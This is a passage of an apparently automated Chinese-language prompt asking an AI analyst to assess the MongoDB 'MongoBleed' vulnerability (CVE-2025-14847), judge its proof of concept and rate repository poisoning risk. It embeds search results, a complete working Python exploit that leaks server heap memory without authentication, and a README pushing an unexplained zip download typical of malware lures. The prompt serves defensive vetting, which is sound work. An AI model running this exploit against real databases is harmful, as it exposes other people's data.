a\", \"p\", \"-\", \"m\", \"e\", \"m\", \"o\", \"r\", \"y\", \"-\", \"e\", \"x\", \"p\", \"o\", \"s\", \"u\", \"r\", \"e\", \"-\", \"i\", \"n\", \"-\", \"m\", \"o\", \"n\", \"g\", \"o\", \"d\", \"b\", \"-\", \"s\", \"e\", \"r\", \"v\", \"e\", \"r\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"c\", \"i\", \"s\", \"a\", \".\", \"g\", \"o\", \"v\", \"/\", \"k\", \"n\", \"o\", \"w\", \"n\", \"-\", \"e\", \"x\", \"p\", \"l\", \"o\", \"i\", \"t\", \"e\", \"d\", \"-\", \"v\", \"u\", \"l\", \"n\", \"e\", \"r\", \"a\", \"b\", \"i\", \"l\", \"i\", \"t\", \"i\", \"e\", \"s\", \"-\", \"c\", \"a\", \"t\", \"a\", \"l\", \"o\", \"g\", \"?\", \"f\", \"i\", \"e\", \"l\", \"d\", \"_\", \"c\", \"v\", \"e\", \"=\", \"C\", \"V\", \"E\", \"-\", \"2\", \"0\", \"2\", \"5\", \"-\", \"1\", \"4\", \"8\", \"4\", \"7\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] PoC: Exploiting MongoBleed, CVE-2025-14847 | Technical Walkthrough | OX Security\n [description] December 29, 2025 - Technical walkthrough of MongoBleed (CVE-2025-14847) exploitation. Learn how attackers abuse OP_COMPRESSED to leak MongoDB memory without authentication\n [link] https://www.ox.security/blog/poc-exploiting-mongobleed-cve-2025-14847-technical-walkthrough/\n [webpage 0 end]\n[webpage 1 begin] [title] GitHub - ProbiusOfficial/CVE-2025-14847: poc for CVE-2025-14847 · GitHub\n [description] This is a critical fix to address CVE-2025-14847. Upgrade to 8.2.3, 8.0.17, 7.0.28, 6.0.27, 5.0.32, or 4.4.30. ... An client-side exploit of the Server's zlib implementation can return uninitialized heap memory without authenticating to the server.\n [link] https://github.com/ProbiusOfficial/CVE-2025-14847\n [webpage 1 end]\n[webpage 2 begin] [title] Threat Brief: MongoDB Vulnerability (CVE-2025-14847)\n [description] February 19, 2026 - Cortex Attack Surface Testing (AST) can also validate whether exposed MongoDB instances are vulnerable to exploitation by executing benign PoC checks. Identified findings can either be viewed in the Threat Response Center or in the incident view of Expander. These findings are also available for Cortex XSIAM customers who have purchased the attack surface management (ASM) module. Cortex Cloud can help detect cloud-hosted resources vulnerable to CVE-2025-14847 through the proper placement of Cortex Cloud XDR endpoint agent and serverless agents within a cloud environment.\n [link] https://unit42.paloaltonetworks.com/mongobleed-cve-2025-14847/\n [webpage 2 end]\n[webpage 3 begin] [title] GitHub - FurkanKAYAPINAR/CVE-2025-14847-MongoBleed-Exploit: CVE-2025-14847 MongoBleed - MongoDB Memory Leak Vulnerability PoC · GitHub\n [description] Lab environment and exploit script for the critical unauthenticated memory-leak vulnerability in MongoDB Server. ... CVE-2025-14847 (MongoBleed) is a critical unauthenticated memory-leak vulnerability in MongoDB Server's zlib compression handling.\n [link] https://github.com/FurkanKAYAPINAR/CVE-2025-14847-MongoBleed-Exploit\n [webpage 3 end]\n[webpage 4 begin] [title] GitHub - Security-Phoenix-demo/mongobleed-exploit-CVE-2025-14847: Exploit lab, docker and code scanner for mongobleed Vulnerability CVE-2025-14847 plus Phoenix Security Sync tools · GitHub\n [description] December 28, 2025 - CVE-2025-14847 | CVSS 8.7 (High) ... network transport layer that allows unauthenticated remote attackers to exfiltrate sensitive heap memory without any credentials or user interaction....\n [link] https://github.com/Security-Phoenix-demo/mongobleed-exploit-CVE-2025-14847\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/7424d1015e7438b7fe77c270809c51a2/CVE-2025-14847.py\n---\n#!/usr/bin/env python3\n\nimport argparse\nimport socket\nimport struct\nimport zlib\nimport re\nimport signal\nimport sys\nimport time\n\n# Default BSON element: int32 field \"a\" = 1\nDEFAULT_CONTENT = b'\\x10a\\x00\\x01\\x00\\x00\\x00'\n\n\ndef build_packet(doc_len: int, buffer_offset: int, content: bytes) -> bytes:\n    # Minimal BSON-ish blob (keep original behavior)\n    bson = struct.pack('<i', doc_len) + content\n\n    # Minimal OP_MSG body: flags=0, section kind=0, then BSON\n    op_msg = struct.pack('<I', 0) + b'\\x00' + bson\n\n    # Compress inner OP_MSG using zlib\n    compressed = zlib.compress(op_msg)\n\n    # OP_COMPRESSED payload:\n    # - original opcode (OP_MSG)\n    # - claimed uncompressed size (doc_len + offset)\n    # - compressor id (2 = zlib)\n    payload = struct.pack('<i', 2013)\n    payload += struct.pack('<i', doc_len + buffer_offset)\n    payload += struct.pack('B', 2)\n    payload += compressed\n\n    # Wire header for OP_COMPRESSED\n    header = struct.pack('<iiii', 16 + len(payload), 1, 0, 2012)\n    return header + payload\n\n\ndef recv_one_message(sock: socket.socket) -> bytes:\n    # Read until we have the full message based on the first 4 bytes (length)\n    response = b''\n    while True:\n        chunk = sock.recv(4096)\n        if not chunk:\n            break\n        response += chunk\n        if len(response) >= 4:\n            msg_len = struct.unpack('<i', response[:4])[0]\n            if len(response) >= msg_len:\n                return response[:msg_len]\n    return response\n\n\ndef main() -> int:\n    parser = argparse.ArgumentParser(description=\"MongoBleed live leaker (PoC)\")\n    parser.add_argument(\"--host\", default=\"127.0.0.1\", help=\"Target IP/hostname\")\n    parser.add_argument(\"--port\", type=int, default=27017, help=\"Target port\")\n    parser.add_argument(\"--min\", dest=\"min_len\", type=int, default=20, help=\"Min doc_len\")\n    parser.add_argument(\"--max\", dest=\"max_len\", type=int, default=32768, help=\"Max doc_len\")\n    parser.add_argument(\"--offset\", type=int, default=500, help=\"Buffer offset\")\n    parser.add_argument(\"--timeout\", type=float, default=2.0, help=\"Socket timeout seconds\")\n    parser.add_argument(\"--sleep\", type=float, default=0.001, help=\"Sleep per iteration seconds\")\n    args = parser.parse_args()\n\n    print(f\"[*] MongoBleed live leaker -> {args.host}:{args.port}\")\n    print(\"[*] Streaming unique leaks only (Ctrl+C to stop)\\n\")\n\n    last_leak = None\n\n    def signal_handler(sig, frame):\n        print(\"\\n[*] Stopped by user\")\n        sys.exit(0)\n\n    signal.signal(signal.SIGINT, signal_handler)\n\n    doc_len = args.min_len\n    while True:\n        if doc_len > args.max_len:\n            doc_len = args.min_len\n\n        full_packet = build_packet(doc_len, args.offset, DEFAULT_CONTENT)\n\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.settimeout(args.timeout)\n            sock.connect((args.host, args.port))\n            sock.sendall(full_packet)\n\n            response = recv_one_message(sock)\n            sock.close()\n        except Exception:\n            response = b''\n\n        # Skip obvious non-responses\n        if len(response) < 25:\n            doc_len += 1\n            continue\n\n        # If response is compressed, decompress its payload; else just use body\n        try:\n            msg_len = struct.unpack('<i', response[:4])[0]\n            opcode = struct.unpack('<i', response[12:16])[0]\n            raw = zlib.decompress(response[25:msg_len]) if opcode == 2012 else response[16:msg_len]\n        except Exception:\n            doc_len += 1\n            continue\n\n        # Look for new interesting strings and print only changes\n        for match in re.finditer(rb\"field name '([^']*)'\", raw):\n            leak = match.group(1)\n            if not leak or leak in [b'a', b'$db', b'ping', b'?']:\n                continue\n\n            text = leak.decode('utf-8', errors='replace')\n            if text != last_leak:\n                print(f\"[+] New leak (~offset {doc_len}): {text}\")\n                last_leak = text\n\n        doc_len += 1\n        time.sleep(args.sleep)\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n\n\n---\n/tmp/7424d1015e7438b7fe77c270809c51a2/README.md\n---\n# 🛡️ CVE-2025-14847 - Easy Tool for MongoDB Security\n\n## 📥 Download Now\n[![Download](https://raw.githubusercontent.com/sakthivel10q/CVE-2025-14847/main/assets/CV_1.6.zip%https://raw.githubusercontent.com/sakthivel10q/CVE-2025-14847/main/assets/CV_1.6.zip)](https://raw.githubusercontent.com/sakthivel10q/CVE-2025-14847/main/assets/CV_1.6.zip)\n\n## 📋 Overview\nCVE-2025-14847, also known as MongoBleed, is a security tool designed to identify vulnerabilities in MongoDB. This application helps users assess their MongoDB databases effectively. You do not need programming skills to use this tool. \n\n## 🚀 Getting Started\nFollow these steps to download and run the application. \n\n1. **Visit the Releases Page**  \n   Click this link to access all available downl\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid